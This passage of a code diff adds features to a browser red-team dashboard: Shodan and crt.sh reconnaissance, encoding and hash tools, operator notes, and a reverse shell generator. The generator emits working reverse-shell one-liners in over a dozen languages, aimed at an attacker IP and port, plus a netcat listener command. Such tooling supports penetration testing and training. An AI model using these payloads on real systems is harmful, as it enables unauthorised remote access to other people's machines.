+        const dnsData = await dnsResp.json();
+        if (dnsData.Answer && dnsData.Answer.length > 0) {
+          ip = dnsData.Answer[0].data;
+        } else {
+          tbody.innerHTML = `<tr><td colspan="4" style="text-align:center;color:var(--red);padding:20px;font-family:'Share Tech Mono',monospace;font-size:12px">Could not resolve ${target.host} to an IP address.</td></tr>`;
+          return;
+        }
+      }
+    } catch {
+      tbody.innerHTML = `<tr><td colspan="4" style="text-align:center;color:var(--red);padding:20px;font-family:'Share Tech Mono',monospace;font-size:12px">DNS resolution failed for ${target.host}.</td></tr>`;
+      return;
+    }
+  }
+
+  try {
+    const resp = await fetch(`https://internetdb.shodan.io/${ip}`);
+    if (!resp.ok) {
+      tbody.innerHTML = `<tr><td colspan="4" style="text-align:center;color:var(--text-dim);padding:20px;font-family:'Share Tech Mono',monospace;font-size:12px">No data available from Shodan InternetDB for ${ip}. The host may not be indexed.</td></tr>`;
+      return;
+    }
+    const data = await resp.json();
+    const ports = data.ports || [];
+    const hostnames = data.hostnames || [];
+    const vulns = data.vulns || [];
+    const cpes = data.cpes || [];
+    const tags = data.tags || [];
+
+    if (ports.length === 0) {
+      tbody.innerHTML = `<tr><td colspan="4" style="text-align:center;color:var(--text-dim);padding:20px;font-family:'Share Tech Mono',monospace;font-size:12px">No open ports found for ${ip} in Shodan InternetDB.</td></tr>`;
+      return;
+    }
+
+    let html = ports.map(p => {
+      const svc = getServiceName(p);
+      const cpe = cpes.find(c => c.includes(svc.toLowerCase())) || '';
+      return `<tr>
+        <td style="color:var(--neon2)">${p}/tcp</td>
+        <td>${svc}</td>
+        <td><span class="badge badge-green">OPEN</span></td>
+        <td style="color:var(--text-dim)">${cpe || '-'}</td>
+      </tr>`;
+    }).join('');
+
+    html += `<tr><td colspan="4" style="padding:10px 12px;font-size:11px;font-family:'Share Tech Mono',monospace">
+      <div style="color:var(--neon2);margin-bottom:4px">IP: ${ip} | Ports: ${ports.length} open</div>
+      ${hostnames.length ? '<div style="color:var(--text-dim)">Hostnames: ' + escapeHtml(hostnames.join(', ')) + '</div>' : ''}
+      ${vulns.length ? '<div style="color:var(--red);margin-top:4px">Known CVEs: ' + escapeHtml(vulns.join(', ')) + '</div>' : ''}
+      ${tags.length ? '<div style="color:var(--text-dim);margin-top:4px">Tags: ' + escapeHtml(tags.join(', ')) + '</div>' : ''}
+      <div style="color:var(--text-dim);margin-top:6px">⚠ Passive reconnaissance data from Shodan InternetDB (no active scanning performed)</div>
+    </td></tr>`;
+
+    tbody.innerHTML = html;
+  } catch (err) {
+    tbody.innerHTML = `<tr><td colspan="4" style="text-align:center;color:var(--red);padding:20px;font-family:'Share Tech Mono',monospace;font-size:12px">Error querying Shodan InternetDB: ${escapeHtml(String(err.message || err))}</td></tr>`;
+  }
+}
+
+// ══════════════════════════════════════════════
+// SUBDOMAIN DISCOVERY
+// ══════════════════════════════════════════════
+async function runSubdomainScan() {
+  const domain = document.getElementById('subdomain-input').value.trim();
+  if (!domain) {
+    document.getElementById('subdomain-status').textContent = 'Please enter a domain.';
     return;
   }
-  const scanType = document.getElementById('port-scan-type').value;
-  const tbody = document.getElementById('port-tbody');
-  tbody.innerHTML = `<tr><td colspan="4" style="text-align:center;color:var(--neon);font-family:'Share Tech Mono',monospace;font-size:12px;padding:20px">Scanning ${target.host} with ${scanType}...</td></tr>`;
+  const spinner = document.getElementById('subdomain-spinner');
+  const tbody = document.getElementById('subdomain-tbody');
+  const status = document.getElementById('subdomain-status');
+  spinner.style.display = 'block';
+  status.textContent = `Searching certificate transparency logs for ${domain}...`;
+  tbody.innerHTML = '<tr><td colspan="3" style="text-align:center;color:var(--neon);padding:20px">Searching...</td></tr>';
 
-  setTimeout(() => {
-    const open = COMMON_PORTS.filter(p => p.port >= startPort && p.port <= endPort).filter(() => Math.random() > 0.6);
-    if (open.length === 0) open.push(COMMON_PORTS[5], COMMON_PORTS[10]);
-    const versions = ['1.2.3','2.0.1','5.4.2','8.1.0','latest','N/A'];
-    tbody.innerHTML = open.map(p => `
+  try {
+    const resp = await fetch(`https://crt.sh/?q=%25.${encodeURIComponent(domain)}&output=json`);
+    if (!resp.ok) throw new Error('crt.sh returned an error');
+    const data = await resp.json();
+
+    const subdomains = new Map();
+    data.forEach(entry => {
+      const names = entry.common_name.split('\n').concat((entry.name_value || '').split('\n'));
+      names.forEach(n => {
+        const name = n.trim().toLowerCase().replace(/^\*\./, '');
+        if (name && name.endsWith(domain) && !subdomains.has(name)) {
+          subdomains.set(name, { issuer: entry.issuer_name, notBefore: entry.not_before });
+        }
+      });
+    });
+
+    const sorted = [...subdomains.entries()].sort((a, b) => a[0].localeCompare(b[0]));
+    spinner.style.display = 'none';
+
+    if (sorted.length === 0) {
+      status.textContent = `No subdomains found for ${domain}.`;
+      tbody.innerHTML = '<tr><td colspan="3" style="text-align:center;color:var(--text-dim);padding:20px">No subdomains found</td></tr>';
+      return;
+    }
+
+    status.textContent = `Found ${sorted.length} unique subdomains for ${domain}.`;
+    tbody.innerHTML = sorted.map(([name, info]) => `
       <tr>
-        <td style="color:var(--neon2)">${p.port}/tcp</td>
-        <td>${p.svc}</td>
-        <td><span class="badge badge-green">OPEN</span></td>
-        <td style="color:var(--text-dim)">${p.svc.toLowerCase()} ${versions[Math.floor(Math.random()*versions.length)]}</td>
+        <td style="color:var(--neon2)">${escapeHtml(name)}</td>
+        <td style="color:var(--text-dim)">${escapeHtml(info.issuer || 'N/A')}</td>
+        <td>${info.notBefore || 'N/A'}</td>
       </tr>
-    `).join('') + `<tr><td colspan="4" style="color:var(--text-dim);font-size:11px;padding:10px 12px;font-family:'Share Tech Mono',monospace">Scan complete for ${target.host}. ${open.length} open ports found. ⚠ Browser-safe simulated results.</td></tr>`;
-  }, 2000);
+    `).join('');
+  } catch (err) {
+    spinner.style.display = 'none';
+    status.textContent = `Error: ${err.message}`;
+    tbody.innerHTML = `<tr><td colspan="3" style="text-align:center;color:var(--red);padding:20px">Failed to query crt.sh. Try again later.</td></tr>`;
+  }
+}
+
+// ══════════════════════════════════════════════
+// REVERSE SHELL GENERATOR
+// ══════════════════════════════════════════════
+function generateRevShell() {
+  const lang = document.getElementById('revshell-lang').value;
+  const ip = document.getElementById('revshell-ip').value || '10.10.14.1';
+  const port = document.getElementById('revshell-port').value || '4444';
+
+  const shells = {
+    bash: `bash -i >& /dev/tcp/${ip}/${port} 0>&1`,
+    bash2: `0<&196;exec 196<>/dev/tcp/${ip}/${port}; sh <&196 >&196 2>&196`,
+    python: `python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${ip}",${port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'`,
+    python3: `python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${ip}",${port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'`,
+    php: `php -r '$sock=fsockopen("${ip}",${port});exec("/bin/sh -i <&3 >&3 2>&3");'`,
+    perl: `perl -e 'use Socket;$i="${ip}";$p=${port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'`,
+    ruby: `ruby -rsocket -e'f=TCPSocket.open("${ip}",${port}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'`,
+    nc: `nc -e /bin/sh ${ip} ${port}`,
+    ncmkfifo: `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ${ip} ${port} >/tmp/f`,
+    powershell: `powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('${ip}',${port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"`,
+    java: `Runtime r = Runtime.getRuntime(); String[] cmd = {"/bin/bash","-c","exec 5<>/dev/tcp/${ip}/${port};cat <&5 | while read line; do $line 2>&5 >&5; done"}; Process p = r.exec(cmd);`,
+    xterm: `xterm -display ${ip}:1`,
+    socat: `socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:${ip}:${port}`,
+    lua: `lua -e "require('socket');require('os');t=socket.tcp();t:connect('${ip}','${port}');os.execute('/bin/sh -i <&3 >&3 2>&3');"`,
+  };
+
+  document.getElementById('revshell-output').textContent = shells[lang] || 'Select a language';
+  document.getElementById('revshell-listener').textContent = `nc -lvnp ${port}`;
+}
+
+function copyRevShell(btn) {
+  const text = document.getElementById('revshell-output').textContent;
+  navigator.clipboard.writeText(text).then(() => {
+    btn.textContent = 'Copied!';
+    btn.classList.add('copied');
+    setTimeout(() => { btn.textContent = 'Copy Shell'; btn.classList.remove('copied'); }, 2000);
+  });
+}
+
+function copyListener(btn) {
+  const text = document.getElementById('revshell-listener').textContent;
+  navigator.clipboard.writeText(text).then(() => {
+    btn.textContent = 'Copied!';
+    btn.classList.add('copied');
+    setTimeout(() => { btn.textContent = 'Copy Listener'; btn.classList.remove('copied'); }, 2000);
+  });
+}
+
+// ══════════════════════════════════════════════
+// ENCODING / DECODING
+// ══════════════════════════════════════════════
+let currentEncodingType = 'base64';
+
+function setEncodingType(type, btn) {
+  currentEncodingType = type;
+  document.querySelectorAll('#encoding-type-btns .btn-tool').forEach(b => b.classList.remove('active'));
+  if (btn) btn.classList.add('active');
+}
+
+function doEncode() {
+  const input = document.getElementById('enc-input').value;
+  let output = '';
+  try {
+    switch (currentEncodingType) {
+      case 'base64': output = btoa(Array.from(new TextEncoder().encode(input)).map(b => String.fromCharCode(b)).join('')); break;
+      case 'url': output = encodeURIComponent(input); break;
+      case 'html': output = input.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;').replace(/'/g,'&#39;'); break;
+      case 'hex': output = Array.from(new TextEncoder().encode(input)).map(b => b.toString(16).padStart(2,'0')).join(' '); break;
+      case 'rot13': output = input.replace(/[a-zA-Z]/g, c => String.fromCharCode(c.charCodeAt(0) + (c.toLowerCase() < 'n' ? 13 : -13))); break;
+    }
+  } catch (e) { output = 'Error: ' + e.message; }
+  document.getElementById('enc-output').value = output;
+}
+
+function doDecode() {
+  const input = document.getElementById('enc-input').value;
+  let output = '';
+  try {
+    switch (currentEncodingType) {
+      case 'base64': { const bytes = atob(input); output = new TextDecoder().decode(new Uint8Array([...bytes].map(c => c.charCodeAt(0)))); break; }
+      case 'url': output = decodeURIComponent(input); break;
+      case 'html': {
+        const el = document.createElement('textarea');
+        el.innerHTML = input;
+        output = el.value;
+        break;
+      }
+      case 'hex': output = new TextDecoder().decode(new Uint8Array(input.trim().split(/\s+/).map(h => parseInt(h, 16)))); break;
+      case 'rot13': output = input.replace(/[a-zA-Z]/g, c => String.fromCharCode(c.charCodeAt(0) + (c.toLowerCase() < 'n' ? 13 : -13))); break;
+    }
+  } catch (e) { output = 'Error: Invalid input for decoding. ' + e.message; }
+  document.getElementById('enc-output').value = output;
+}
+
+function copyEncOutput(btn) {
+  const text = document.getElementById('enc-output').value;
+  navigator.clipboard.writeText(text).then(() => {
+    btn.textContent = 'Copied!';
+    btn.classList.add('copied');
+    setTimeout(() => { btn.textContent = 'Copy Output'; btn.classList.remove('copied'); }, 2000);
+  });
+}
+
+function swapEncFields() {
+  const inp = document.getElementById('enc-input');
+  const out = document.getElementById('enc-output');
+  const tmp = inp.value;
+  inp.value = out.value;
+  out.value = tmp;
+}
+
+// ══════════════════════════════════════════════
+// HASH IDENTIFIER
+// ══════════════════════════════════════════════
+function identifyHash() {
+  const hash = document.getElementById('hash-input').value.trim();
+  const container = document.getElementById('hash-results');
+  if (!hash) {
+    container.innerHTML = '<div style="color:var(--text-dim);padding:12px;text-align:center;font-family:Share Tech Mono,monospace;font-size:12px">Enter a hash above to identify its type</div>';
+    return;
+  }
+
+  const len = hash.length;
+  const isHex = /^[a-fA-F0-9]+$/.test(hash);
+  const isBase64 = /^[A-Za-z0-9+/=]+$/.test(hash) && hash.length % 4 === 0;
+  const matches = [];
+
+  if (isHex) {
+    if (len === 32) matches.push('MD5', 'NTLM', 'MD4');
+    if (len === 40) matches.push('SHA-1', 'RIPEMD-160');
+    if (len === 56) matches.push('SHA-224', 'SHA3-224');
+    if (len === 64) matches.push('SHA-256', 'SHA3-256', 'Keccak-256');
+    if (len === 96) matches.push('SHA-384', 'SHA3-384');
+    if (len === 128) matches.push('SHA-512', 'SHA3-512', 'Whirlpool');
+    if (len === 16) matches.push('MySQL 3.x (short)', 'CRC-64');
+    if (len === 8) matches.push('CRC-32', 'Adler-32');
+  }
+
+  if (/^\$2[aby]?\$/.test(hash)) matches.push('bcrypt');
+  if (/^\$6\$/.test(hash)) matches.push('SHA-512 crypt (Unix)');
+  if (/^\$5\$/.test(hash)) matches.push('SHA-256 crypt (Unix)');
+  if (/^\$1\$/.test(hash)) matches.push('MD5 crypt (Unix)');
+  if (/^\$apr1\$/.test(hash)) matches.push('Apache APR1 MD5');
+  if (/^\$argon2/.test(hash)) matches.push('Argon2');
+  if (/^[a-fA-F0-9]{32}:[a-fA-F0-9]+$/.test(hash)) matches.push('MD5 with salt');
+  if (/^\{SHA\}/.test(hash)) matches.push('LDAP SHA');
+  if (/^\{SSHA\}/.test(hash)) matches.push('LDAP SSHA');
+  if (isBase64 && len === 44) matches.push('SHA-256 (Base64)');
+  if (isBase64 && len === 88) matches.push('SHA-512 (Base64)');
+  if (isBase64 && len === 24) matches.push('MD5 (Base64)');
+
+  if (matches.length === 0) {
+    matches.push('Unknown hash type');
+  }
+
+  container.innerHTML = `
+    <div class="hash-result">
+      <div class="info-label" style="margin-bottom:8px">Input Analysis</div>
+      <div style="font-family:'Share Tech Mono',monospace;font-size:12px;color:var(--text);margin-bottom:12px">
+        Length: <span style="color:var(--neon)">${len}</span> characters |
+        Hex: <span style="color:var(--neon)">${isHex ? 'Yes' : 'No'}</span> |
+        Base64: <span style="color:var(--neon)">${isBase64 ? 'Possible' : 'No'}</span>
+      </div>
+      <div class="info-label" style="margin-bottom:8px">Possible Hash Types</div>
+      <div>${matches.map(m => `<span class="hash-type">${m}</span>`).join('')}</div>
+    </div>
+  `;
+}
+
+// ══════════════════════════════════════════════
+// OPERATION NOTES
+// ══════════════════════════════════════════════
+function loadNotes() {
+  const saved = JSON.parse(localStorage.getItem('rt-op-notes') || 'null');
+  if (saved) {
+    document.getElementById('notes-textarea').value = saved.content || '';
+    document.getElementById('notes-meta').textContent = `Last saved: ${saved.timestamp || 'Unknown'}`;
+  }
+}
+
+function saveNotes() {
+  const content = document.getElementById('notes-textarea').value;
+  const timestamp = new Date().toISOString();
+  localStorage.setItem('rt-op-notes', JSON.stringify({ content, timestamp }));
+  document.getElementById('notes-meta').textContent = `Saved at: ${timestamp}`;
+}
+
+function exportNotes() {
+  const content = document.getElementById('notes-textarea').value;
+  if (!content) return;
+  const blob = new Blob([`RedTeam Operator Notes\nExported: ${new Date().toISOString()}\n${'='.repeat(50)}\n\n${content}`], { type: 'text/plain' });
+  const a = document.createElement('a');
+  a.href = URL.createObjectURL(blob);
+  a.download = `op-notes-${new Date().toISOString().replace(/[:.]/g,'-')}.txt`;
+  a.click();
+  URL.revokeObjectURL(a.href);
+}
+
+function clearNotes() {
+  if (confirm('Clear all operation notes?')) {
+    document.getElementById('notes-textarea').value = '';
+    localStorage.removeItem('rt-op-notes');
+    document.getElementById('notes-meta').textContent = 'No saved notes';
+  }
+}
+
+// ══════════════════════════════════════════════
+// EXPORT REPORT
+// ══════════════════════════════════════════════
+function exportReport() {
+  const intel = gatheredIntel;
+  const lines = [];
+  lines.push('='.repeat(60));
+  lines.push('  REDTEAM OPERATOR DASHBOARD - INTELLIGENCE REPORT');
+  lines.push('='.repeat(60));
+  lines.push(`Generated: ${new Date().toISOString()}`);
+  lines.push('');
+
+  if (intel.parsed) {
+    const p = intel.parsed;
+    const r = intel.result || {};
+    lines.push(`Target: ${p.host}`);
+    lines.push(`Type: ${p.isIP ? 'IP Address' : 'Domain'}`);
+    lines.push('');
+
+    lines.push('--- DNS RECORDS ---');
+    Object.keys(r.dns || {}).forEach(type => {
+      const records = (r.dns[type] || []).map(rec => rec.data).join(', ');
+      lines.push(`  ${type}: ${records || 'None'}`);
+    });
+    lines.push('');
+
+    if (r.geo) {
+      lines.push('--- GEOLOCATION ---');
+      lines.push(`  Location: ${r.geo.city}, ${r.geo.region} ${r.geo.country_name}`);
+      lines.push(`  ISP/Org: ${r.geo.org || 'N/A'}`);
+      lines.push(`  ASN: ${r.geo.asn || 'N/A'}`);
+      lines.push('');
+    }
+
+    if (r.probe) {
+      lines.push('--- HTTP PROBE ---');
+      lines.push(`  Status: ${r.probe.status} ${r.probe.statusText}`);
+      if (r.headers) {
+        Object.keys(r.headers).forEach(h => {
+          lines.push(`  ${h}: ${r.headers[h]}`);
+        });
+      }
+      lines.push('');
+    }
+
+    if (r.ssl && r.ssl.length > 0) {
+      lines.push('--- SSL/TLS (crt.sh) ---');
+      r.ssl.slice(0,3).forEach(cert => {
+        lines.push(`  CN: ${cert.common_name} | Issuer: ${cert.issuer_name} | Expires: ${cert.not_after}`);
+      });
+      lines.push('');
+    }
+  } else {
+    lines.push('No analysis has been run yet. Run Target Analysis first.');
+    lines.push('');
+  }
+
+  const notes = document.getElementById('notes-textarea')?.value;
+  if (notes) {
+    lines.push('--- OPERATION NOTES ---');
+    lines.push(notes);
+    lines.push('');
+  }
+
+  lines.push('='.repeat(60));
+  lines.push('  END OF REPORT');
+  lines.push('='.repeat(60));
+
+  const blob = new Blob([lines.join('\n')], { type: 'text/plain' });
+  const a = document.createElement('a');
+  a.href = URL.createObjectURL(blob);
+  a.download = `redteam-report-${new Date().toISOString().replace(/[:.]/g,'-')}.txt`;
+  a.click();
+  URL.revokeObjectURL(a.href);
 }
 
 // ══════════════════════════════════════════════
@@ -1683,12 +2430,33 @@ function clearHighlights() {
 // TERMINAL
 // ══════════════════════════════════════════════
 const TERMINAL_CMDS = {
-  help: () => `Available commands:\n  <span class="t-cmd">help</span>        — Show this help\n  <span class="t-cmd">scan</span>        — Run target analysis\n  <span class="t-cmd">nmap</span>        — Jump to Nmap library\n  <span class="t-cmd">enum</span>        — Jump to Enumeration\n  <span class="t-cmd">checklist</span>   — Jump to Checklist\n  <span class="t-cmd">lifecycle</span>   — Jump to Red Team Lifecycle\n  <span class="t-cmd">clear</span>       — Clear terminal\n  <span class="t-cmd">whoami</span>      — Identity check\n  <span class="t-cmd">date</span>        — Current timestamp`,
+  help: () => `Available commands:\n  <span class="t-cmd">help</span>         — Show this help\n  <span class="t-cmd">scan</span>         — Run target analysis\n  <span class="t-cmd">nmap</span>         — Jump to Nmap library\n  <span class="t-cmd">enum</span>         — Jump to Enumeration\n  <span class="t-cmd">checklist</span>    — Jump to Checklist\n  <span class="t-cmd">lifecycle</span>    — Jump to Red Team Lifecycle\n  <span class="t-cmd">subdomains</span>   — Jump to Subdomain Discovery\n  <span class="t-cmd">revshell</span>     — Jump to Reverse Shell Generator\n  <span class="t-cmd">encode</span>       — Jump to Encoding Tools\n  <span class="t-cmd">hash</span>         — Jump to Hash Identifier\n  <span class="t-cmd">notes</span>        — Jump to Operation Notes\n  <span class="t-cmd">export</span>       — Export intelligence report\n  <span class="t-cmd">status</span>       — Show gathered intel summary\n  <span class="t-cmd">theme</span>        — Cycle themes\n  <span class="t-cmd">clear</span>        — Clear terminal\n  <span class="t-cmd">whoami</span>       — Identity check\n  <span class="t-cmd">date</span>         — Current timestamp`,
   scan: () => { closeTerminal(); setTimeout(() => document.getElementById('target-input').focus(), 200); return '<span class="t-out">Redirecting to Target Analysis...</span>'; },
   nmap: () => { closeTerminal(); setTimeout(() => scrollTo_('#nmap-section'), 200); return '<span class="t-out">Jumping to Nmap Library...</span>'; },
   enum: () => { closeTerminal(); setTimeout(() => scrollTo_('#enum-section'), 200); return '<span class="t-out">Jumping to Enumeration...</span>'; },
   checklist: () => { closeTerminal(); setTimeout(() => scrollTo_('#checklist-section'), 200); return '<span class="t-out">Jumping to Checklist...</span>'; },
   lifecycle: () => { closeTerminal(); setTimeout(() => scrollTo_('#lifecycle-section'), 200); return '<span class="t-out">Jumping to Lifecycle...</span>'; },
+  subdomains: () => { closeTerminal(); setTimeout(() => scrollTo_('#subdomain-section'), 200); return '<span class="t-out">Jumping to Subdomain Discovery...</span>'; },
+  revshell: () => { closeTerminal(); setTimeout(() => scrollTo_('#revshell-section'), 200); return '<span class="t-out">Jumping to Reverse Shell Generator...</span>'; },
+  encode: () => { closeTerminal(); setTimeout(() => scrollTo_('#encoding-section'), 200); return '<span class="t-out">Jumping to Encoding Tools...</span>'; },
+  hash: () => { closeTerminal(); setTimeout(() => scrollTo_('#hash-section'), 200); return '<span class="t-out">Jumping to Hash Identifier...</span>'; },
+  notes: () => { closeTerminal(); setTimeout(() => scrollTo_('#notes-section'), 200); return '<span class="t-out">Jumping to Operation Notes...</span>'; },
+  export: () => { exportReport(); return '<span class="t-out">Exporting intelligence report...</span>'; },
+  status: () => {
+    const i = gatheredIntel;
+    if (!i.parsed) return '<span class="t-out">No intel gathered yet. Run a scan first.</span>';
+    const r = i.result || {};
+    const aRecs = (r.dns?.['A'] || []).length;
+    const ports = r.shodan?.ports?.length || 0;
+    return '<span class="t-out">Target: ' + i.parsed.host + '\n  DNS A records: ' + aRecs + '\n  RDAP: ' + (r.rdap ? 'Yes' : 'No') + '\n  SSL certs: ' + (r.ssl?.length || 0) + '\n  Geolocation: ' + (r.geo ? r.geo.city + ', ' + r.geo.country_name : 'N/A') + '\n  Last scan: ' + (i.timestamp || 'N/A') + '</span>';
+  },
+  theme: () => {
+    const themes = ['', 'cyberpunk', 'stealth'];
+    const current = document.documentElement.getAttribute('data-theme') || '';
+    const idx = (themes.indexOf(current) + 1) % themes.length;
+    setTheme(themes[idx], document.querySelectorAll('.theme-btn')[idx]);
+    return '<span class="t-out">Theme changed to: ' + (themes[idx] || 'matrix') + '</span>';
+  },
   whoami: () => '<span class="t-out">operator | clearance: ALPHA | status: ACTIVE</span>',
   date: () => `<span class="t-out">${new Date().toString()}</span>`,
   clear: () => '__clear__',
@@ -1769,6 +2537,8 @@ function initApp() {
   renderCodeBlocks(ENUM_COMMANDS, 'enum-blocks');
   renderChecklist();
   buildCommand();
+  generateRevShell();
+  loadNotes();
 }
 
 initApp();
